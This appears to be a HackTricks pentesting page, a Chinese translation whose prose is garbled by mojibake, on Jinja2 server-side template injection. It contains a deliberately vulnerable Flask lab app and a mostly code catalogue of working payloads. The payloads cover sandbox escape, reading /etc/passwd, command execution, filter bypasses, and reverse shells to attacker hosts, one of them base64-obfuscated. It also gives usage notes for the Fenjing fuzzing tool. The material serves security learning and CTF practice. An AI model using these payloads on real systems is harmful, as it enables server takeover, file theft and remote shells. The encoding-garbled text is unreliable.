<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Jinja2 SSTI</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="jinja2-ssti"><a class="header" href="#jinja2-ssti">Jinja2 SSTI</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>é€šè¿‡ 8kSec å­¦é™¢æ·±åŒ–æ‚¨åœ¨ <strong>ç§»åŠ¨å®‰å…¨</strong> æ–¹é¢çš„ä¸“ä¸šçŸ¥è¯†ã€‚é€šè¿‡æˆ‘ä»¬çš„è‡ªå­¦è¯¾ç¨‹æŒæ¡ iOS å’Œ Android å®‰å…¨å¹¶è·å¾—è®¤è¯ï¼š</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<h2 id="å®éªŒå®¤"><a class="header" href="#å®éªŒå®¤"><strong>å®éªŒå®¤</strong></a></h2>
<pre><code class="language-python">from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
</code></pre>
<h2 id="æ‚é¡¹"><a class="header" href="#æ‚é¡¹"><strong>æ‚é¡¹</strong></a></h2>
<h3 id="è°ƒè¯•è¯­å¥"><a class="header" href="#è°ƒè¯•è¯­å¥"><strong>è°ƒè¯•è¯­å¥</strong></a></h3>
<p>å¦‚æœå¯ç”¨äº†è°ƒè¯•æ‰©å±•ï¼Œå°†å¯ä»¥ä½¿ç”¨ <code>debug</code> æ ‡ç­¾æ¥è½¬å‚¨å½“å‰ä¸Šä¸‹æ–‡ä»¥åŠå¯ç”¨çš„è¿‡æ»¤å™¨å’Œæµ‹è¯•ã€‚è¿™å¯¹äºæŸ¥çœ‹åœ¨æ¨¡æ¿ä¸­å¯ä»¥ä½¿ç”¨çš„å†…å®¹è€Œæ— éœ€è®¾ç½®è°ƒè¯•å™¨éå¸¸æœ‰ç”¨ã€‚</p>
<pre><code class="language-python">&lt;pre&gt;

{% raw %}
{% debug %}
{% endraw %}








&lt;/pre&gt;
</code></pre>
<h3 id="è½¬å‚¨æ‰€æœ‰é…ç½®å˜é‡"><a class="header" href="#è½¬å‚¨æ‰€æœ‰é…ç½®å˜é‡"><strong>è½¬å‚¨æ‰€æœ‰é…ç½®å˜é‡</strong></a></h3>
<pre><code class="language-python">{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
&lt;dt&gt;{{ key|e }}&lt;/dt&gt;
&lt;dd&gt;{{ value|e }}&lt;/dd&gt;
{% endfor %}
{% endraw %}






</code></pre>
<h2 id="jinja-æ³¨å…¥"><a class="header" href="#jinja-æ³¨å…¥"><strong>Jinja æ³¨å…¥</strong></a></h2>
<p>é¦–å…ˆï¼Œåœ¨ Jinja æ³¨å…¥ä¸­ï¼Œæ‚¨éœ€è¦<strong>æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä»æ²™ç®±ä¸­é€ƒè„±</strong>å¹¶æ¢å¤è®¿é—®å¸¸è§„çš„ Python æ‰§è¡Œæµç¨‹ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦<strong>æ»¥ç”¨å¯¹è±¡</strong>ï¼Œè¿™äº›å¯¹è±¡<strong>æ¥è‡ªéæ²™ç®±ç¯å¢ƒï¼Œä½†å¯ä»¥ä»æ²™ç®±ä¸­è®¿é—®</strong>ã€‚</p>
<h3 id="è®¿é—®å…¨å±€å¯¹è±¡"><a class="header" href="#è®¿é—®å…¨å±€å¯¹è±¡">è®¿é—®å…¨å±€å¯¹è±¡</a></h3>
<p>ä¾‹å¦‚ï¼Œåœ¨ä»£ç  <code>render_template("hello.html", username=username, email=email)</code> ä¸­ï¼Œå¯¹è±¡ username å’Œ email <strong>æ¥è‡ªéæ²™ç®±çš„ Python ç¯å¢ƒ</strong>ï¼Œå¹¶ä¸”åœ¨<strong>æ²™ç®±ç¯å¢ƒ</strong>ä¸­å°†æ˜¯<strong>å¯è®¿é—®çš„</strong>ã€‚<br />
æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–å¯¹è±¡å°†<strong>å§‹ç»ˆå¯ä»¥ä»æ²™ç®±ç¯å¢ƒä¸­è®¿é—®</strong>ï¼Œè¿™äº›å¯¹è±¡æ˜¯ï¼š</p>
<pre><code>[]
''
()
dict
config
request
</code></pre>
<h3 id="æ¢å¤-class-object"><a class="header" href="#æ¢å¤-class-object">æ¢å¤ &lt;class 'object'&gt;</a></h3>
<p>ç„¶åï¼Œä»è¿™äº›å¯¹è±¡ä¸­æˆ‘ä»¬éœ€è¦åˆ°è¾¾ç±»ï¼š<strong><code>&lt;class 'object'&gt;</code></strong> ä»¥å°è¯• <strong>æ¢å¤</strong> å®šä¹‰çš„ <strong>ç±»</strong>ã€‚è¿™æ˜¯å› ä¸ºä»è¿™ä¸ªå¯¹è±¡æˆ‘ä»¬å¯ä»¥è°ƒç”¨ <strong><code>__subclasses__</code></strong> æ–¹æ³•å¹¶ <strong>è®¿é—®æ‰€æœ‰éæ²™ç®±</strong> python ç¯å¢ƒä¸­çš„ç±»ã€‚</p>
<p>ä¸ºäº†è®¿é—®è¯¥ <strong>å¯¹è±¡ç±»</strong>ï¼Œæ‚¨éœ€è¦ <strong>è®¿é—®ä¸€ä¸ªç±»å¯¹è±¡</strong>ï¼Œç„¶åè®¿é—® <strong><code>__base__</code></strong>ã€<strong><code>__mro__()[-1]</code></strong> æˆ– <strong><code>mro()[-1]</code></strong>ã€‚ç„¶åï¼Œåœ¨åˆ°è¾¾è¿™ä¸ª <strong>å¯¹è±¡ç±»</strong> ä¹‹åï¼Œæˆ‘ä»¬ <strong>è°ƒç”¨</strong> <strong><code>__subclasses__()</code></strong>ã€‚</p>
<p>æŸ¥çœ‹è¿™äº›ç¤ºä¾‹ï¼š</p>
<pre><code class="language-python"># To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
</code></pre>
<h3 id="rce-escaping"><a class="header" href="#rce-escaping">RCE Escaping</a></h3>
<p><strong>æ¢å¤äº†</strong> <code>&lt;class 'object'&gt;</code> å¹¶è°ƒç”¨äº† <code>__subclasses__</code>ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨è¿™äº›ç±»æ¥è¯»å–å’Œå†™å…¥æ–‡ä»¶ä»¥åŠæ‰§è¡Œä»£ç ã€‚</p>
<p>å¯¹ <code>__subclasses__</code> çš„è°ƒç”¨ç»™äº†æˆ‘ä»¬æœºä¼š <strong>è®¿é—®æ•°ç™¾ä¸ªæ–°å‡½æ•°</strong>ï¼Œæˆ‘ä»¬å°†ä»…é€šè¿‡è®¿é—® <strong>æ–‡ä»¶ç±»</strong> æ¥ <strong>è¯»å–/å†™å…¥æ–‡ä»¶</strong> æˆ–ä»»ä½•å…·æœ‰è®¿é—®æƒé™çš„ç±»ï¼Œè¯¥ç±» <strong>å…è®¸æ‰§è¡Œå‘½ä»¤</strong>ï¼ˆå¦‚ <code>os</code>ï¼‰ã€‚</p>
<p><strong>è¯»å–/å†™å…¥è¿œç¨‹æ–‡ä»¶</strong></p>
<pre><code class="language-python"># ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
</code></pre>
<p><strong>RCE</strong></p>
<pre><code class="language-python"># The class 396 is the class &lt;class 'subprocess.Popen'&gt;
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

&lt;div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'&gt; a &lt;/div&gt;

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

</code></pre>
<p>è¦äº†è§£æ‚¨å¯ä»¥ä½¿ç”¨çš„<strong>æ›´å¤šç±»</strong>ä»¥<strong>é€ƒé¿</strong>ï¼Œæ‚¨å¯ä»¥<strong>æŸ¥çœ‹</strong>ï¼š</p>
<p>{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
<a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/">bypass-python-sandboxes</a>
{% endcontent-ref %}</p>
<h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a class="header" href="#è¿‡æ»¤å™¨ç»•è¿‡">è¿‡æ»¤å™¨ç»•è¿‡</a></h3>
<h4 id="å¸¸è§ç»•è¿‡"><a class="header" href="#å¸¸è§ç»•è¿‡">å¸¸è§ç»•è¿‡</a></h4>
<p>è¿™äº›ç»•è¿‡å°†å…è®¸æˆ‘ä»¬<strong>è®¿é—®</strong>å¯¹è±¡çš„<strong>å±æ€§</strong>ï¼Œ<strong>è€Œä¸ä½¿ç”¨æŸäº›å­—ç¬¦</strong>ã€‚<br />
æˆ‘ä»¬å·²ç»åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­çœ‹åˆ°äº†ä¸€äº›è¿™äº›ç»•è¿‡ï¼Œä½†åœ¨è¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼š</p>
<pre><code class="language-bash"># Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}






</code></pre>
<ul>
<li><a href="jinja2-ssti.html#accessing-global-objects"><strong>è¿”å›è¿™é‡Œä»¥è·å–æ›´å¤šè®¿é—®å…¨å±€å¯¹è±¡çš„é€‰é¡¹</strong></a></li>
<li><a href="jinja2-ssti.html#recovering-less-than-class-object-greater-than"><strong>è¿”å›è¿™é‡Œä»¥è·å–æ›´å¤šè®¿é—®å¯¹è±¡ç±»çš„é€‰é¡¹</strong></a></li>
<li><a href="jinja2-ssti.html#jinja-injection-without-less-than-class-object-greater-than"><strong>é˜…è¯»æ­¤å†…å®¹ä»¥åœ¨æ²¡æœ‰å¯¹è±¡ç±»çš„æƒ…å†µä¸‹è·å–RCE</strong></a></li>
</ul>
<p><strong>é¿å…HTMLç¼–ç </strong></p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒFlaskå‡ºäºå®‰å…¨åŸå› å¯¹æ¨¡æ¿ä¸­çš„æ‰€æœ‰å†…å®¹è¿›è¡ŒHTMLç¼–ç ï¼š</p>
<pre><code class="language-python">{{'&lt;script&gt;alert(1);&lt;/script&gt;'}}
#will be
&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
</code></pre>
<p><strong><code>safe</code></strong> è¿‡æ»¤å™¨å…è®¸æˆ‘ä»¬å°† JavaScript å’Œ HTML æ³¨å…¥åˆ°é¡µé¢ä¸­ <strong>è€Œä¸</strong> è¿›è¡Œ <strong>HTML ç¼–ç </strong>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-python">{{'&lt;script&gt;alert(1);&lt;/script&gt;'|safe}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
</code></pre>
<p><strong>é€šè¿‡ç¼–å†™æ¶æ„é…ç½®æ–‡ä»¶è¿›è¡ŒRCEã€‚</strong></p>
<pre><code class="language-python"># evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1"',shell=True) }}
</code></pre>
<h2 id="æ²¡æœ‰å‡ ä¸ªå­—ç¬¦"><a class="header" href="#æ²¡æœ‰å‡ ä¸ªå­—ç¬¦">æ²¡æœ‰å‡ ä¸ªå­—ç¬¦</a></h2>
<p>æ²¡æœ‰ <strong><code>{{</code></strong> <strong><code>.</code></strong> <strong><code>[</code></strong> <strong><code>]</code></strong> <strong><code>}}</code></strong> <strong><code>_</code></strong></p>
<pre><code class="language-python">{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}






</code></pre>
<h2 id="jinja-æ³¨å…¥è€Œä¸ä½¿ç”¨-class-object"><a class="header" href="#jinja-æ³¨å…¥è€Œä¸ä½¿ç”¨-class-object">Jinja æ³¨å…¥è€Œä¸ä½¿ç”¨ <strong>&lt;class 'object'&gt;</strong></a></h2>
<p>ä» <a href="jinja2-ssti.html#accessing-global-objects"><strong>å…¨å±€å¯¹è±¡</strong></a> æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨è¯¥ç±»çš„æƒ…å†µä¸‹è·å¾— <strong>RCEã€‚</strong><br />
å¦‚æœä½ è®¾æ³•ä»è¿™äº›å…¨å±€å¯¹è±¡ä¸­è·å–ä»»ä½• <strong>å‡½æ•°</strong>ï¼Œä½ å°†èƒ½å¤Ÿè®¿é—® <strong><code>__globals__.__builtins__</code></strong>ï¼Œä»é‚£é‡Œè·å– <strong>RCE</strong> æ˜¯éå¸¸ <strong>ç®€å•</strong> çš„ã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä»å¯¹è±¡ <strong><code>request</code></strong>ã€<strong><code>config</code></strong> å’Œä»»ä½• <strong>å…¶ä»–</strong> æœ‰è¶£çš„ <strong>å…¨å±€å¯¹è±¡</strong> ä¸­æ‰¾åˆ° <strong>å‡½æ•°</strong>ï¼š</p>
<pre><code class="language-bash">{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
</code></pre>
<p>ä¸€æ—¦ä½ æ‰¾åˆ°äº†ä¸€äº›å‡½æ•°ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¢å¤å†…ç½®å‡½æ•°ï¼š</p>
<pre><code class="language-python"># Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}


## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
</code></pre>
<h3 id="fuzzing-waf-bypass"><a class="header" href="#fuzzing-waf-bypass">Fuzzing WAF bypass</a></h3>
<p><strong>Fenjing</strong> <a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a> æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºCTFçš„å·¥å…·ï¼Œä½†åœ¨çœŸå®åœºæ™¯ä¸­ä¹Ÿå¯ä»¥ç”¨äºæš´åŠ›ç ´è§£æ— æ•ˆå‚æ•°ã€‚è¯¥å·¥å…·ä»…é€šè¿‡å–·æ´’å•è¯å’ŒæŸ¥è¯¢æ¥æ£€æµ‹è¿‡æ»¤å™¨ï¼Œå¯»æ‰¾ç»•è¿‡æ–¹æ³•ï¼Œå¹¶æä¾›äº¤äº’å¼æ§åˆ¶å°ã€‚</p>
<pre><code>webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/&lt;payload&gt;the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
</code></pre>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
<li>æŸ¥çœ‹ <a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3">attr trick to bypass blacklisted chars in here</a>.</li>
<li><a href="https://twitter.com/SecGus/status/1198976764351066113">https://twitter.com/SecGus/status/1198976764351066113</a></li>
<li><a href="https://hackmd.io/@Chivato/HyWsJ31dI">https://hackmd.io/@Chivato/HyWsJ31dI</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<img src="../../.gitbook/assets/image (2).png" alt="" data-size="original">
<p>é€šè¿‡ 8kSec Academy æ·±å…¥æ‚¨çš„ <strong>ç§»åŠ¨å®‰å…¨</strong> ä¸“ä¸šçŸ¥è¯†ã€‚é€šè¿‡æˆ‘ä»¬çš„è‡ªå­¦è¯¾ç¨‹æŒæ¡ iOS å’Œ Android å®‰å…¨å¹¶è·å¾—è®¤è¯ï¼š</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
